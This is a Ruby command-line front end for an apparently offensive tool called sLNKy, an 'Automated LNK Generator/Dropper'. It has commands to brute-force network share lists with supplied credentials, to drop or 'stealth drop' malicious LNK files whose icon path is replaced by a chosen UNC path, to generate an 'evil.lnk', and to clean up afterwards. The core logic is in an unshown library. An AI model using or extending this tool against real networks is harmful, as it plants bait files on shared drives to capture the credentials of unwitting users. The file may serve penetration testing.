require_relative 'lib/main.rb'

def raise_targets_required(options)

	if options[:targets] and options[:target_list]

		raise "Error: Provide only a file name or a list of comma separated targets!"

	elsif ! options[:targets] and ! options[:target_list]

		raise "Error: A target or a list of comma separated targets are required!"

	end

end

def raise_shares_required(options)

	if options[:shares] and options[:share_list]

		raise "Error: Provide only a file name or a list of comma separated shares!"

	elsif ! options[:shares] and ! options[:share_list]

		raise "Error: A target or a list of comma separated shares are required!"

	end

end

def prune_and_split(list)

	list.gsub!(/\s/,'') if list =~ /\s/
	return list.split(',')

end

class CLI < Thor

	@@config = OpenStruct.new()
	@@credentials = OpenStruct.new()
	@@config.creds = @@credentials

	desc "brute", "Just bruteforce a list of shares and write a log file"

	option :target_list, {required: false,
		type: :string,
		desc: 'Comma separated list of targets.',
		aliases: ['-t']}

	option :targets, {required: false,
		type: :string,
		desc: 'File containing a list of new line separated hosts.',
		aliases: ['-T']}

	option :shares, {required: false, 
		type: :string, 
		desc: 'A file containing a list of share names.',
		aliases: ['-S']}

	option :share_list, {required: false, 
		type: :string, 
		desc: 'A comma separated list of share names to bruteforce.',
		aliases: ['-s']}

	option :brute_logfile, {required: false,
		default: 'bruteforced_shares.csv',
		type: :string,
		desc: 'File that bruteforced share log records are written to.'
	}

	option :logdir, {required: false,
		default: 'slnky_logs',
		type: :string,
		desc: 'Directory to receive written log files.'
	}

	option :domain, {required: false,
		default: '',
		type: :string,
		desc: 'Domain used during authentication',
		aliases: ['-D']}

	option :username, {required: false,
		default: '',
		type: :string,
		desc: 'Username used during authentication.',
		aliases: ['-U']}

	option :password, {required: false,
		default: '',
		type: :string,
		desc: 'Password used during authentication.',
		aliases: ['-P']}

	def brute()

		raise_shares_required(options)

		@@config.mode = :brute

		@@config.targetfile = options[:targets]
		@@config.targetlist = options[:target_list]

		@@config.sharelist = options[:share_list]
		@@config.shares = options[:shares]

		@@credentials.username = options[:username]
		@@credentials.password = options[:password]
		@@credentials.domain = options[:domain]

		@@config.logdir = options[:logdir]
		@@config.brute_logfile = options[:brute_logfile]

		if @@config.sharelist
			@@config.sharelist = prune_and_split(@@config.sharelist)
		end

		if @@config.targetlist
			@@config.targetlist = prune_and_split(@@config.targetlist)
		end

		sLNKy(@@config)

	end

	desc "drop", "Drop a statically named LNK file on discovered shares."

	### Required Arguments ###

	option :lnkname, {required: true,
		type: :string,
		desc: 'Name of LNK file that will be dropped to shares.',
		aliases: ['-l']}
	
	option :icon_unc_path, {required: true, 
		type: :string,
		desc: 'UNC path that replaces the icon path.',
		aliases: ['-u']}

	option :targets, {required: false,
		type: :string,
		desc: 'File containing a list of new line separated hosts.',
		aliases: ['-T']}

	option :target_list, {required: false,
		type: :string,
		desc: 'Comma separated list of targets.',
		aliases: ['-t']}

	### Optional Arguments ###

	option :share_list, {required: false, 
		type: :string, 
		desc: 'A comma separated list of share names to bruteforce.',
		aliases: ['-s']}

	option :shares, {required: false, 
		type: :string, 
		desc: 'A file containing a list of share names.',
		aliases: ['-S']}

	option :domain, {required: false,
		default: '',
		type: :string,
		desc: 'Domain used during authentication',
		aliases: ['-D']}

	option :username, {required: false,
		default: '',
		type: :string,
		desc: 'Username used during authentication.',
		aliases: ['-U']}

	option :password, {required: false,
		default: '',
		type: :string,
		desc: 'Password used during authentication.',
		aliases: ['-P']}

	option :lnk_logfile, {required: false,
		default: 'dropped_lnks.csv',
		type: :string,
		desc: 'File that dropped link log records are written to.'
	}

	option :brute_logfile, {required: false,
		default: 'bruteforced_shares.csv',
		type: :string,
		desc: 'File that bruteforced share log records are written to.'
	}

	option :logdir, {required: false,
		default: 'slnky_logs',
		type: :string,
		desc: 'Directory to receive written log files.'
	}

	def drop()

		raise_targets_required(options)

		@@config.mode = :drop
		@@config.lnkname = options[:lnkname]
		@@config.unc_path = options[:icon_unc_path]
		@@config.targetfile = options[:targets]
		@@config.targetlist = options[:target_list]
		
		@@config.shares = options[:shares]
		@@config.sharelist = options[:share_list]

		@@credentials.username = options[:username]
		@@credentials.password = options[:password]
		@@credentials.domain = options[:domain]

		@@config.logdir = options[:logdir]
		@@config.lnk_logfile = options[:lnk_logfile]
		@@config.brute_logfile = options[:brute_logfile]

		if @@config.sharelist
			@@config.sharelist = prune_and_split(@@config.sharelist)
		end

		if @@config.targetlist
			@@config.targetlist = prune_and_split(@@config.targetlist)
		end

		sLNKy(@@config)

	end

	desc "stealth_drop", "Detect files on connected share and generate a LNK of a randomly sampled file name."

	##### LNK CONFIGURATION

	option :fallback_lnkname, {required: true,
		type: :string,
		desc: 'Name of LNK file that is used if no files are available to sample.',
		aliases: ['-l']}

	option :icon_unc_path, {required: true,
		type: :string,
		desc: 'UNC path that replaces the icon path.',
		aliases: ['-u']
	}

	##### TARGET CONFIGURATION

	option :target_list, {required: false,
		type: :string,
		desc: 'Comma separated list of hosts to target.',
		aliases: ['-t']
	}
	
	option :targets, {required: false,
		type: :string,
		desc: 'File containing a list of new line separated hosts.',
		aliases: ['-T']
	}

	##### SHARE CONFIGURATION

	option :share_list, {required: false,
		type: :string,
		desc: 'A file containing a list of share names.',
		aliases: ['-s']
	}
	
	option :shares, {required: false,
		type: :string,
		desc: 'A file containing a list of share names.',
		aliases: ['-S']
	}

	##### CREDENTIALS CONFIGURATION

	option :domain, {required: false,
		default: '',
		type: :string,
		desc: 'Domain used during authentication',
		aliases: ['-D']
	}

	option :username, {required: false,
		default: '',
		type: :string,
		desc: 'Usernamed used during authentication.',
		aliases: ['-U']
	}

	option :password, {required: false,
		default: '',
		type: :string,
		desc: 'Password used during authentication.',
		aliases: ['-P']
	}

	##### LOGGING CONFIGURATIONS

	option :logdir, {required: false,
		default: 'slnky_logs',
		type: :string,
		desc: 'Directory to receive written log files.'
	}

	option :lnk_logfile, {required: false,
		default: 'dropped_lnks.csv',
		type: :string,
		desc: 'File that log records are written to.'
	}

	option :brute_logfile, {required: false,
		default: 'bruteforced_shares.csv',
		type: :string,
		desc: 'File that bruteforced share log records are written to.'
	}

	def stealth_drop()

		raise_targets_required(options)

		@@config.mode = :stealth_drop
		@@config.lnkname = options[:fallback_lnkname] 
		@@config.unc_path = options[:icon_unc_path]

		@@config.targetfile = options[:targets]
		@@config.targetlist = options[:target_list]

		@@config.shares = options[:shares]
		@@config.sharelist = options[:share_list]

		@@config.logdir = options[:logdir]
		@@config.lnk_logfile = options[:lnk_logfile]
		@@config.brute_logfile = options[:brute_logfile]

		@@credentials.username = options[:username]
		@@credentials.password = options[:password]
		@@credentials.domain = options[:domain]

		if @@config.sharelist
			@@config.sharelist = prune_and_split(@@config.sharelist)
		end

		if @@config.targetlist
			@@config.targetlist = prune_and_split(@@config.targetlist)
		end

		sLNKy(@@config)

	end

	desc "clean", "Clean up dropped LNK files."

	option :logfile, {required: true,
		default: 'dropped_lnks.csv',
		type: :string,
		desc: 'CSV log file generated by sLNKy when the malicious links were dropped.',
		aliases: ['-L']
	}

	option :domain, {required: false,
		default: '',
		type: :string,
		desc: 'Domain used during authentication',
		aliases: ['-D']
	}
	
	option :username, {required: false,
		default: '',
		type: :string,
		desc: 'Usernamed used during authentication.',
		aliases: ['-U']
	}
	
	option :password, {required: false,
		default: '',
		type: :string,
		desc: 'Password used during authentication.',
		aliases: ['-P']
	}

	def clean()

		@@config.mode = :clean
		@@config.lnk_logfile = options[:logfile]

		@@credentials.username = options[:username]
		@@credentials.password = options[:password]
		@@credentials.domain = options[:domain]

		sLNKy(@@config)

	end

	desc "generate", "Generate a malicious LNK file. Updates icon path to user defined UNC path."

	option :icon_unc_path, {
		required: true,
		type: :string,
		aliases: ['-i']
	}
	
	option :outfile, {
		required: true,
		default: 'evil.lnk',
		type: :string,
		aliases: ['-O']
	}

	def generate()

		@@config.mode = :generate
		@@config.unc_path = options[:icon_unc_path]
		@@config.lnk_outfile = options[:outfile]

		sLNKy(@@config)

	end

end

# $VERBOSE = nil
# $VERBOSE = false

banner = %[
\t\t                           _ /\\
\t\t                _     _   / / /_
\t\t          _____/ /   / | / / // /_  __
\t\t         / ___/ /   /  |/ / ,< / / / /
\t\t        (__  ) /___/ /|  / /| / /_/ / 
\t\t  _____/____/_____/_/ | /_/ /_\\_,  /______
\t\t /____________________|/___________V.02__/]

puts banner.green.bold
puts "\n\t\t     Automated LNK Generator/Dropper".green
puts
CLI.start(ARGV)